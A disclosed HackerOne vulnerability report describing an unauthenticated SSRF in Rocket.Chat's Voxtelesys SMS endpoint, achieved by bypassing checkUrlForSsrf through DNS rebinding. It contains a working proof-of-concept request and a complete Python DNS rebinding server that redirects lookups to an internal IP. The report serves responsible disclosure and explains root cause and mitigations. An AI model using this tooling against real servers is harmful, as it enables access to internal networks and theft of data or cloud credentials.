---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/server-side-request-forgery-ssrf
  - env/network
substate: "resolved"
weakness: "Server-Side Request Forgery (SSRF)"
enriched: true
body: true
date: 2026-07-29
submitted: 2025-12-20T04:13:20.860Z
bounty_usd: null
votes: 28
cve: "CVE-2024-39713"
program: "[[programs/rocket_chat|Rocket.Chat]]"
reporter: "button142857"
source: "https://hackerone.com/reports/3473145"
title: "Unauthenticated SSRF in Voxtelesys integration ('checkUrlForSsrf' Bypass via DNS rebinding)"
---
# Unauthenticated SSRF in Voxtelesys integration ('checkUrlForSsrf' Bypass via DNS rebinding)

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 28 | **Program:** Rocket.Chat | **Disclosed:** 2026-07-29

- Report: [https://hackerone.com/reports/3473145](https://hackerone.com/reports/3473145)
- CWE: Server-Side Request Forgery (SSRF) | CVE: CVE-2024-39713
- Submitted: 2025-12-20T04:13:20.860Z

## Report summary

Rocket.Chat version 7.13.2 contains an SSRF vulnerability caused by a DNS rebinding attack, which allows access to internal hosts and reading of their responses.

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:** 
Rocket.Chat version 7.13.2 contains an SSRF vulnerability caused by a DNS rebinding attack, which allows access to internal hosts and reading of their responses.
This issue further bypasses the fix for CVE-2024-39713.

Rocket.Chat provides SMS integration features using Twilio and Voxtelesys, which can be used to access external media and retrieve files. During this process, the `checkUrlForSsrf` function is used to verify that a URL does not point to an internal host. However, this function is vulnerable to DNS rebinding attacks, and when a URL whose domain is controlled by an attacker is submitted, the check can be bypassed, potentially allowing access to internal hosts that would otherwise be unreachable.

**Details:**
In my test environment, I set up an httpbin server on the same LAN as the Rocket.Chat server.
The httpbin server is running at 192.168.100.14:80, and an attacker cannot reach this server directly from outside. 
In addition, a DNS server for performing a DNS rebinding attack was deployed within the same LAN, and the Rocket.Chat server was configured to use it for name resolution. 
When resolving the name `conamikan.test`, the DNS server returns an external server address (1.1.1.1) with TTL=0 on the first request, and returns 192.168.100.14 on the second and subsequent requests. All other DNS queries are forwarded to 8.8.8.8. The specific implementation is provided in the attachment.
In a realistic scenario, when accessing a domain controlled by an attacker, name resolution would be performed by the attacker’s DNS server. Therefore, this environment is sufficient for verifying DNS rebinding attacks.

Step 0: 
As a prerequisite, Voxtelesys must be enabled in the SMS settings.
{F5138160}

Step 1: 
An attacker can trigger the SSRF by executing the following script. No authentication is required. (Set <Rocket.Chat hostIP> according to your environment.)
```
POST "http://<Rocket.Chat hostIP>/api/v1/livechat/sms-incoming/voxtelesys" \
  -H "Content-Type: application/json" \
  -d '{
    "from": "+15551112222",
    "to": "+15550001111",
    "body": "Hello from Voxtelesys",
    "received_at": "2024-01-01T00:00:00Z",
    "media": [
      "http://conamikan.test"
    ]
  }'
```
At this point, an SSRF request to the internal server has already been performed.
{F5138169}

Step 2: 
A LiveChat agent user can download and view the response from the chat room.
{F5138172}

**PoC:**
{F5138175}

## Root Cause:
In the `getUploadFile` function in `sms.ts`, which is used by this feature, the URL provided by the user is first checked by the `checkUrlForSsrf` function, and then the file is retrieved using the`fetch` function.
{F5138179}
Within the `checkUrlForSsrf` function, `nslookup` is used to verify whether the IP address associated with the domain is valid or not.
{F5138180}

However, in a DNS rebinding attack, the TTL of the DNS response is set to 0 (or an extremely small value). As a result, during the initial nslookup, `conamikan.test` resolves to `1.1.1.1` and passes the check. When the file is fetched, the cache cannot be used and name resolution is performed again. At that time, `conamikan.test` is resolved to `192.168.100.14` by the attacker’s DNS server. Since the check has already been passed, access to the internal server is performed without further validation.
Completely mitigating DNS rebinding attacks is difficult, and it is generally recommended to avoid making outbound requests to arbitrary URLs whenever possible. However, if such a feature is required, the following mitigation measures should be implemented:
* Allow only HTTPS URLs
* For HTTP, use the IP address resolved during the initial nslookup directly
* Reject DNS responses with extremely small TTL values


** attachment **
Below is the script for the DNS server used in the verification.
When building the environment with Docker, you can run this in a container on the same LAN and perform the verification by configuring this server as the DNS for the Rocket.Chat container.
```
from dnslib import DNSRecord, QTYPE, RR, A
from dnslib.server import DNSServer
import socket
import time

# settings
DOMAIN = "conamikan.test."  # attacker's domein
GLOBAL_IP = "1.1.1.1"   # something valid IP address
TARGET_IP = "192.168.100.14" # internal IP address
UPSTREAM_DNS = "8.8.8.8"    # Forwarding destination(Google DNS server)

class RebindResolver:
    def __init__(self):
        # Initialize count as an instance variable
        self.request_count = 0
        self.reset_timer = time.perf_counter()

    def resolve(self, request, handler):
        # Reset self.request_count every 5 seconds
        if (time.perf_counter() - self.reset_timer) > 5:
            self.request_count = 0
            self.reset_timer = time.perf_counter()

        qname = str(request.q.qname).strip(".")
        target_domain = DOMAIN.strip(".")

        # Only for conamikan.test
        if qname == target_domain:
            reply = request.reply()
            
            # Return GLOBAL_IP only when self.request_count is 0
            if self.request_count == 0:
                ip = GLOBAL_IP
            else:
                ip = TARGET_IP
            
            self.request_count += 1
            
            # TTL is 0
            reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(ip), ttl=0))
            print(f"[*] [REBIND] {qname} -> {ip} (Count: {self.request_count})")
            return reply

        # Forward other domains to Google DNS
        else:
            try:
                proxy_req = request.pack()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2.0)
                sock.sendto(proxy_req, (UPSTREAM_DNS, 53))
                
                data, _ = sock.recvfrom(512)
                print(f"[+] [FORWARD] {qname} to {UPSTREAM_DNS}")
                return DNSRecord.parse(data)
            except Exception as e:
                print(f"[!] [ERROR] Failed to forward {qname}: {e}")
                return request.reply()

if __name__ == "__main__":
    resolver = RebindResolver()
    server = DNSServer(resolver, port=53, address="0.0.0.0")
    print(f"DNS Server started. Rebinding: {DOMAIN}, Forwarding: {UPSTREAM_DNS}")
    server.start()
```

## Impact

This enables an attacker to reach internal network resources that would normally be inaccessible and to perform network scanning. Because an attacker can receive responses from internal hosts, the risk of data leakage is very high and requires immediate remediation. The same technique can also be used to access cloud services and metadata endpoints, potentially exposing sensitive cloud-side data and credentials, so there is a significant risk of cloud information leakage.

## Timeline

- **Report Filed**
- **Report Triaged**
- **Report Resolved**
- **2026-02-19** @button142857: Hi Julio

Thank you for the fix.
I'm sorry to add another task to your plate, but would you mind handling the CVE request for this vulnerability?
- **2026-02-27** @button142857: Hi Julio,

I'm just checking in to see if there are any updates regarding the CVE requests.

Also, I had another quick question about the following policy in your guidelines. Am I eligible for this?
>Swag Policy
>We currently give compensation to our researchers by sending them some really cool swags from Rocket.Chat depending on the severity of the vulnerability. Currently we’re only sending swags to High and Critical vulnerabilities.

I understand you must be busy, so please take your time getting back to me.

regards,
- **2026-04-12** @button142857: Hi Julio
Thank you for the fix.
I'm sorry to add another task to your plate, but would you mind handling the CVE request for this vulnerability?
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
